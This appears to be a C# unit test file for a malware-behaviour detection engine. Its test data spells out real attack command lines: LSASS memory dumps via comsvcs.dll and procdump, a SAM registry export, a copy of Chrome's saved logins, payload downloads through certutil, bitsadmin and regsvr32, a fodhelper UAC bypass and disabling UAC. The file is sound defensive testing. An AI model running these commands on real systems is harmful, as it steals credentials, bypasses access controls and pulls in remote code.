using Blazma.Core.Events;

namespace Blazma.Analysis.Tests;

/// <summary>Credential theft, downloads through Windows tools, UAC bypass, ransom notes and disguised programs.</summary>
public class AttackRuleTests
{
    private const string Desktop = @"C:\Users\WDAGUtilityAccount\Desktop\";

    private static (Ev Ev, ProcessKey Sample) Begin()
    {
        var ev = new Ev();
        var sample = ev.Start(0, 100, 1, "sample.exe", Desktop + "sample.exe", sample: true);
        return (ev, sample);
    }

    private static bool Has(Ev ev, string ruleId) => TestEngine.Run(ev.Events).Findings.Any(f => f.RuleId == ruleId);

    [Theory]
    [InlineData("rundll32.exe", @"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 640 C:\Users\Public\l.dmp full")]
    [InlineData("procdump.exe", @"procdump.exe -accepteula -ma lsass.exe C:\Temp\out.dmp")]
    [InlineData("reg.exe", @"reg.exe save HKLM\SAM C:\Users\Public\sam.save")]
    [InlineData("cmd.exe", "cmd.exe /c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" %TEMP%\\ld.db")]
    public void Reading_stored_passwords_is_caught(string name, string command)
    {
        var (ev, _) = Begin();
        ev.Start(200, 200, 100, name, cmd: command);
        Assert.True(Has(ev, "BLZ-A001"));
    }

    [Fact]
    public void A_copy_of_a_browser_login_file_outside_the_profile_is_caught_but_the_browser_itself_is_not()
    {
        var (ev, sample) = Begin();
        ev.File(300, 100, sample, "sample.exe", EventAction.FileCreate, @"C:\Users\WDAGUtilityAccount\AppData\Local\Temp\x\Login Data");
        Assert.True(Has(ev, "BLZ-A001"));

        var (browser, _) = Begin();
        var chrome = browser.Start(100, 300, 100, "chrome.exe", @"C:\Program Files\Google\Chrome\Application\chrome.exe");
        browser.File(300, 300, chrome, "chrome.exe", EventAction.FileWrite, @"C:\Users\WDAGUtilityAccount\AppData\Local\Google\Chrome\User Data\Default\Login Data");
        Assert.False(Has(browser, "BLZ-A001"));
    }

    [Theory]
    [InlineData("certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe", true)]
    [InlineData("bitsadmin.exe", "bitsadmin /transfer job https://example.test/p.bin C:\\Users\\Public\\p.bin", true)]
    [InlineData("regsvr32.exe", "regsvr32 /s /n /u /i:http://example.test/x.sct scrobj.dll", true)]
    [InlineData("certutil.exe", "certutil.exe -hashfile setup.exe SHA256", false)]
    [InlineData("msiexec.exe", "msiexec.exe /i C:\\Users\\Public\\product.msi /qn", false)]
    public void Windows_tools_pointed_at_the_internet_are_caught(string name, string command, bool expected)
    {
        var (ev, _) = Begin();
        ev.Start(200, 200, 100, name, cmd: command);
        Assert.Equal(expected, Has(ev, "BLZ-E004"));
    }

    [Fact]
    public void Hijacking_an_auto_elevating_program_is_caught()
    {
        var (ev, sample) = Begin();
        ev.Reg(100, 100, sample, "sample.exe", @"HKCU\Software\Classes\ms-settings\shell\open\command", "(Default)", Desktop + "sample.exe");
        var fod = ev.Start(200, 200, 100, "fodhelper.exe");
        ev.Start(300, 300, 200, "sample.exe", Desktop + "sample.exe");
        var finding = TestEngine.Run(ev.Events).Findings.Single(f => f.RuleId == "BLZ-R003");
        Assert.Equal(Severity.Critical, finding.Severity);
        _ = fod;
    }

    [Fact]
    public void Turning_UAC_off_is_caught()
    {
        var (ev, sample) = Begin();
        ev.Reg(100, 100, sample, "sample.exe", @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
        Assert.True(Has(ev, "BLZ-R003"));
    }

    [Fact]
    public void The_same_ransom_note_in_several_folders_is_caught_but_one_readme_is_not()
    {
        var (ev, sample) = Begin();
        foreach (var folder in new[] { "Documents", "Pictures", "Music" })
            ev.File(100, 100, sample, "sample.exe", EventAction.FileCreate, $@"C:\Users\WDAGUtilityAccount\{folder}\HOW_TO_DECRYPT.txt");
        Assert.True(Has(ev, "BLZ-F005"));

        var (installer, s2) = Begin();
        installer.File(100, 100, s2, "sample.exe", EventAction.FileCreate, @"C:\Users\WDAGUtilityAccount\AppData\Local\Tool\README.txt");
        Assert.False(Has(installer, "BLZ-F005"));
    }

    [Fact]
    public void A_Windows_name_running_outside_Windows_is_caught_but_the_real_one_is_not()
    {
        var (ev, sample) = Begin();
        ev.File(100, 100, sample, "sample.exe", EventAction.FileCreate, @"C:\Users\WDAGUtilityAccount\AppData\Roaming\svchost.exe");
        ev.Start(200, 200, 100, "svchost.exe", @"C:\Users\WDAGUtilityAccount\AppData\Roaming\svchost.exe");
        Assert.True(Has(ev, "BLZ-F006"));

        var (real, _) = Begin();
        real.Start(200, 200, 100, "svchost.exe", @"C:\Windows\System32\svchost.exe");
        Assert.False(Has(real, "BLZ-F006"));
    }

    [Fact]
    public void Stealth_cancels_the_installer_discount()
    {
        // A signed installer that also steals credentials gets no reduction at all.
        var (ev, _) = Begin();
        ev.Start(200, 200, 100, "reg.exe", cmd: @"reg.exe save HKLM\SAM C:\Users\Public\sam.save");
        var result = TestEngine.Run(ev.Events);
        var finding = result.Findings.Single(f => f.RuleId == "BLZ-A001");
        Assert.Equal(35, finding.Points);
        Assert.DoesNotContain("counts for less", finding.Explanation.En, StringComparison.Ordinal);
    }
}
